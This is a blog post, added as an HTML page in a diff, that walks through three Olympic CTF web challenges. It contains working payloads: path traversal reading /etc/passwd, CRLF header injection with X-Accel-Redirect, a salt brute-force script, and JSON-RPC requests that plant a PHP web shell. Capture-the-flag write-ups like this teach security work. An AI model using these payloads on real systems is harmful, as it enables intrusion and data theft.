@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Olympic CTF CURLing tasks</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="I had the honour to participate with int3pids in the #Olympic CTF and these are the write ups of the Web tasks we solved.
+CURLing 200: Xnginx In this level we were presented with a simple web site where we could check some news
+First thing to notice is that the news URL is vulnerable to path transversal:
+http://109.233.61.11:27280/news/?f=31-12-2013  http://109.233.61.11:27280/news/?f=../../../../../etc/passwd  Since the name of the task was xnginx I looked for the nginx configuration file:">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Olympic CTF CURLing tasks">
+    <meta name="twitter:description" content="I had the honour to participate with int3pids in the #Olympic CTF and these are the write ups of the Web tasks we solved.
+CURLing 200: Xnginx In this level we were presented with a simple web site where we could check some news
+First thing to notice is that the news URL is vulnerable to path transversal:
+http://109.233.61.11:27280/news/?f=31-12-2013  http://109.233.61.11:27280/news/?f=../../../../../etc/passwd  Since the name of the task was xnginx I looked for the nginx configuration file:">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Olympic CTF CURLing tasks">
+  <meta property="og:description" content="I had the honour to participate with int3pids in the #Olympic CTF and these are the write ups of the Web tasks we solved.
+CURLing 200: Xnginx In this level we were presented with a simple web site where we could check some news
+First thing to notice is that the news URL is vulnerable to path transversal:
+http://109.233.61.11:27280/news/?f=31-12-2013  http://109.233.61.11:27280/news/?f=../../../../../etc/passwd  Since the name of the task was xnginx I looked for the nginx configuration file:">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Olympic CTF CURLing tasks</h1>
+      <p class="post-meta">@pwntester · Feb 9, 2014 · 6 min read</p>
+    </header>
+    <article class="post-content">
+
+<p>I had the honour to participate with <strong>int3pids</strong> in the #Olympic CTF and these are the write ups of the Web tasks we solved.</p>
+
+<h2 id="curling-200-xnginx">CURLing 200: Xnginx</h2>
+
+<p>In this level we were presented with a simple web site where we could check some news</p>
+
+<p><img src="/images/octopress/olympic-web200-1.png" alt="" /></p>
+
+<p>First thing to notice is that the news URL is vulnerable to path transversal:</p>
+
+<pre><code class="language-lang-bash">http://109.233.61.11:27280/news/?f=31-12-2013
+</code></pre>
+
+<pre><code class="language-lang-bash">http://109.233.61.11:27280/news/?f=../../../../../etc/passwd
+</code></pre>
+
+<p>Since the name of the task was <strong>xnginx</strong> I looked for the nginx configuration file:</p>
+
+<pre><code class="language-lang-bash">http://109.233.61.11:27280/news/?f=../../../etc/nginx/nginx.conf
+</code></pre>
+
+<p>That returned the configuration file:</p>
+
+<p><img src="/images/octopress/olympic-web200-2.png" alt="" /></p>
+
+<p>Looking at the configuration file we can see where the site configuration is stored so we issued another request to fetch the site config:</p>
+
+<pre><code class="language-lang-bash">http://109.233.61.11:27280/news/?f=../../../etc/nginx/sites-enabled/default
+</code></pre>
+
+<p>Config file:</p>
+
+<pre><code class="language-lang-bash"># You may add here your
+# server {
+#   ...
+# }
+# statements for each of your virtual hosts to this file
+
+##
+# You should look at the following URL's in order to grasp a solid understanding
+# of Nginx configuration files in order to fully unleash the power of Nginx.
+# http://wiki.nginx.org/Pitfalls
+# http://wiki.nginx.org/QuickStart
+# http://wiki.nginx.org/Configuration
+#
+# Generally, you will want to move this file somewhere, and start with a clean
+# file but keep this around for reference. Or just disable in sites-enabled.
+#
+# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
+##
+
+server {
+    #listen   80; ## listen for ipv4; this line is default and implied
+    #listen   [::]:80 default ipv6only=on; ## listen for ipv6
+
+    root /usr/share/nginx/www;
+    index index.html index.htm;
+
+    # Make site accessible from http://localhost/
+    server_name localhost;
+
+        location / {
+        limit_req zone=one burst=5 nodelay;
+            proxy_pass http://127.0.0.1:5001;
+        }
+
+        location = /secret/flag {
+            root /home;
+            internal;
+        }
+}
+
+
+# another virtual host using mix of IP-, name-, and port-based configuration
+#
+#server {
+#   listen 8000;
+#   listen somename:8080;
+#   server_name somename alias another.alias;
+#   root html;
+#   index index.html index.htm;
+#
+#   location / {
+#       try_files $uri $uri/ /index.html;
+#   }
+#}
+
+
+# HTTPS server
+#
+#server {
+#   listen 443;
+#   server_name localhost;
+#
+#   root html;
+#   index index.html index.htm;
+#
+#   ssl on;
+#   ssl_certificate cert.pem;
+#   ssl_certificate_key cert.key;
+#
+#   ssl_session_timeout 5m;
+#
+#   ssl_protocols SSLv3 TLSv1;
+#   ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv3:+EXP;
+#   ssl_prefer_server_ciphers on;
+#
+#   location / {
+#       try_files $uri $uri/ /index.html;
+#   }
+#}
+</code></pre>
+
+<p>The interesting bits are highlighed:</p>
+
+<pre><code class="language-lang-bash">location = /secret/flag {
+    root /home;
+    internal;
+}
+</code></pre>
+
+<p>Look like the flag is located at <a href="http://109.233.61.11:27280/secret/flag">http://109.233.61.11:27280/secret/flag</a> but only internal requests will get through. This looks like a SSRF task but in the end it was something completly different.</p>
+
+<p>At the same time we found that the return link was vulnerable to Header Manipulation:</p>
+
+<pre><code class="language-lang-bash">http://109.233.61.11:27280/?retpath=/news
+</code></pre>
+
+<p>The above URL generates a redirect to <strong>news</strong></p>
+
+<pre><code class="language-lang-bash">HTTP/1.1 307 TEMPORARY REDIRECT
+Server: nginx/1.1.19
+Date: Sun, 09 Feb 2014 17:07:47 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Connection: keep-alive
+Location: /news
+</code></pre>
+
+<p>And</p>
+
+<pre><code class="language-lang-bash">http://109.233.61.11:27280/?repath=/secret/flag%0d%0aHost:%20127.0.0.1
+</code></pre>
+
+<p>generated:</p>
+
+<pre><code class="language-lang-bash">HTTP/1.1 307 TEMPORARY REDIRECT
+Server: nginx/1.1.19
+Date: Sun, 09 Feb 2014 17:10:22 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Connection: keep-alive
+Location: /secret/flag
+Host: 127.0.0.1
+</code></pre>
+
+<p>However that was not enough to trick nginx.</p>
+
+<p>After researchig about Nginx we found out that it has a similar feature as <a href="https://tn123.org/mod_xsendfile/">Apache mod_xsendfile</a> called <a href="http://wiki.nginx.org/X-accel">X-Accel module</a> that provides internal redirects. So basically nginx will intercept the responses and if it contains the X-Accel-redirect header, it will request the resource specified in the header and return the response back to the user. With that we were able to use the header manipulation vulnerability to craft the following request:</p>
+
+<pre><code class="language-lang-bash">http://109.233.61.11:27280/?retpath=/%0D%0AX-Accel-Redirect%3A%20/secret/flag
+</code></pre>
+
+<p>response was :</p>
+
+<pre><code class="language-lang-bash">HTTP/1.1 200 OK
+Server: nginx/1.1.19
+Date: Sun, 09 Feb 2014 17:15:32 GMT
+Content-Type: text/html; charset=utf-8
+Last-Modified: Thu, 06 Feb 2014 13:55:07 GMT
+Connection: keep-alive
+Content-Length: 38
+
+CTF{6e75d02b8e8329bb4b45c7dabd2e1da2}
+</code></pre>
+
+<h2 id="curling-300-emdee">CURLing 300: emdee</h2>
+
+<p>This level got us crazy for a long time, in the end it was an easy task to solve. We were presented with a revolutionary md5 hashing system :)</p>
+
+<p><img src="/images/octopress/olympic-web300-1.png" alt="" /></p>
+
+<p>Submitting a new secret got us the hash and the timestamp used for the hashing:</p>
+
+<p><img src="/images/octopress/olympic-web300-2.png" alt="" /></p>
+
+<p>After playing with other approaches, including sending long secrets so that the timestamp was cut off, we found out that we could hash non printable characters and some of them were really interesting, specially the &ldquo;del&rdquo; one or <strong>\x7F</strong></p>
+
+<p>We can send del commands to delete previous introduced characters so hash(aa\xF7) == hash(a) for the same timestamp. We can used that to remove all the Salt characters except for the first one and then use the returned timestamp and hash to brute force the first character in the salt. And then repeat to extract the full salt.</p>
+
+<p>To find out the length of the salt we can use the following script:</p>
+
+<pre><code class="language-lang-python">for j in xrange(1,64):
+    secret = '\x7F' * j
+    res = requests.post(URL, data={'secret':secret})
+    ts, h = parse(res.content)
+    if hashlib.md5(ts).hexdigest() == h:
+        SALTLEN = j
+        break
+</code></pre>
+
+<p>We basically send n delete characters and check if the returned hash is the result of hashing the returned timestamp. This gives us a lenght of 40 chracters. Now we can brute force the salt with the following script:</p>
+
+<pre><code class="language-lang-python">import requests
+import re
+import hashlib
+
+def parse(content):
+    m = re.search(r'your_secret \+ ([0-9.]+).*&lt;em&gt;([0-9a-f]+)', content)
+    if not m:
+        raise
+    return m.group(1), m.group(2)
+
+def bruteforce(prefix, h, ts):
+    for c in map(chr, range(32,126)):
+        if hashlib.md5(prefix+c+ts).hexdigest() == h:
+            return c
+    return None
+URL = 'http://109.233.61.11:34380/'
+SALTLEN = 0
+salt = ''
+
+for j in xrange(1,64):
+    secret = '\x7F' * j
+    res = requests.post(URL, data={'secret':secret})
+    ts, h = parse(res.content)
+    if hashlib.md5(ts).hexdigest() == h:
+        SALTLEN = j
+        break
+
+for i in range(SALTLEN):
+    secret = '\x7F' * (39-i)
+    if i == 39:
+        secret = 'a'
+    res = requests.post(URL, data={'secret':secret})
+    ts, h = parse(res.content)
+    if i == 39:
+        ts = secret+ts
+    c = bruteforce(salt, h, ts)
+    salt += c
+print salt
+</code></pre>
+
+<p>Running the script returns us the salf: klgWCV7YgP0ugoiIXE9u0kSXpcnv3Z6eKmkIohJJ</p>
+
+<p>Now we are said that the secret was a &ldquo;short dictionary word&rdquo; so we can run a dictionary attack to find the word that produces the hash so that md5(salt+word) = 40288d60073775070a7edcdcd1df9c56 which turns out to be &ldquo;<strong>cow</strong>&ldquo;</p>
+
+<p>Flag was salt+word: klgWCV7YgP0ugoiIXE9u0kSXpcnv3Z6eKmkIohJJcow</p>
+
+<h2 id="curling-400-rpc">CURLing 400: RPC</h2>
+
+<p>In this level we were presented with a &ldquo;broken&rdquo; link&rdquo; saying:</p>
+
+<pre><code class="language-lang-bash">Notice: Undefined index: rpc_json_call in /var/www/index.php on line 27
+</code></pre>
+
+<p>So we crafted a POST request with the following JSON RPC parameter:</p>
+
+<pre><code class="language-lang-bash">rpc_json_call={ &quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;method&quot;: &quot;function&quot;, &quot;params&quot;: [&quot;123&quot;] }
+</code></pre>
+
+<p>And we got a &ldquo;<strong>invalid method. Try test.</strong>&rdquo; as result.</p>
+
+<p>Nice, so we tried &ldquo;test&rdquo; as indicated and got a &ldquo;<strong>42</strong>&rdquo; as a result. We tried a bunch of methods with no luck until we tried with PHP magic method names and we got different responses for &ldquo;<strong>construct&rdquo; and &ldquo;</strong>wakeup&rdquo; all the remaining ones were returning the invalid method response.</p>
+
+<p>&ldquo;__wakeup&rdquo; was not taking arguments and just returned a 200 OK</p>
+
+<p>&ldquo;__construct&rdquo; was complaining about wrong arguments:</p>
+
+<pre><code class="language-lang-bash">invalid method params! Valid is:
+    log_dir
+    debug
+    state
+</code></pre>
+
+<p>Ok, so we sent a request like</p>
+
+<pre><code class="language-lang-bash">rpc_json_call={ &quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;method&quot;: &quot;__construct&quot;, &quot;params&quot;: {&quot;log_dir&quot;:&quot;/var/www/kk.log&quot;, &quot;debug&quot;:true, &quot;state&quot;:&quot;test&quot;} }
+</code></pre>
+
+<p>We were expecting that we could write in <strong>/var/www/kk.log</strong> but nothing appeared there.</p>
+
+<p>Fortunately we realized that we could send several commands so we tried:</p>
+
+<pre><code class="language-lang-bash">rpc_json_call=[
+ { &quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;method&quot;: &quot;__construct&quot;, &quot;params&quot;: {&quot;log_dir&quot;:&quot;/var/www/kk.log&quot;, &quot;debug&quot;:true, &quot;state&quot;:&quot;test&quot;} },
+ { &quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;method&quot;: &quot;__wakeup&quot;, &quot;params&quot;: {} }
+]
+</code></pre>
+
+<p>And voila, we got a beautiful &ldquo;<strong>&hellip;loged</strong>&rdquo; response so we checked the &ldquo;kk.log&rdquo; file and it was there:</p>
+
+<pre><code class="language-lang-bash">1391967947  O:3:&quot;rpc&quot;:1:{s:5:&quot;state&quot;;s:4:&quot;test&quot;;}
+</code></pre>
+
+<p>It seems like a serialized string but more interetingly, our test string was there, so next step is try to inject a web shell:</p>
+
+<pre><code class="language-lang-bash">rpc_json_call=[
+ { &quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;method&quot;: &quot;__construct&quot;, &quot;params&quot;: {&quot;log_dir&quot;:&quot;/var/www/kk.php&quot;, &quot;debug&quot;:true, &quot;state&quot;:&quot;&lt;? echo file_get_contents('index.php');?&gt;&quot;} },
+ { &quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;method&quot;: &quot;__wakeup&quot;, &quot;params&quot;: {} }
+]
+</code></pre>
+
+<p>And there we go a beautiful shell. All we have to do is:</p>
+
+<pre><code class="language-lang-bash">rpc_json_call=[
+ { &quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;method&quot;: &quot;__construct&quot;, &quot;params&quot;: {&quot;log_dir&quot;:&quot;/var/www/kk.php&quot;, &quot;debug&quot;:true, &quot;state&quot;:&quot;&lt;? passthru($_GET['cmd']);?&gt;&quot;} },
+ { &quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;method&quot;: &quot;__wakeup&quot;, &quot;params&quot;: {} }
+]
+</code></pre>
+
+<p>And then:</p>
+
+<pre><code class="language-lang-bash">http://109.233.61.11:8880/kk.php?cmd=cat%20/FLAG
+</code></pre>
+
+<p>And flag:</p>
+
+<pre><code class="language-lang-bash">1391968178 O:3:&quot;rpc&quot;:1:{s:5:&quot;state&quot;;s:28:&quot;CTF{b15ffee30a117f418d1cede6faa57778} &quot;;}
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/web"><span class="tag">Web</span></a></li>
+        
+          <li><a href="/tags/olympicctf"><span class="tag">OlympicCTF</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2083</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
